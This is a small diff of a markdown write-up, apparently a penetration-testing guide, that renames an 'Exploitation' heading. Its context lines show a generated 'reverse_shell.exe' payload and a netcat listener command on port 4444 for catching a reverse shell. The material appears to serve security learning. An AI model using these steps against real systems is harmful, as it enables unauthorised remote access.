@@ -65,7 +65,7 @@ Final size of exe file: 73802 bytes
 Saved as: reverse_shell.exe
 ```
 
-## Exploitation
+## Delivery & Exploitation
 * Set up netcat to listen on port 4444
 ```
 nc -nvlp 4444
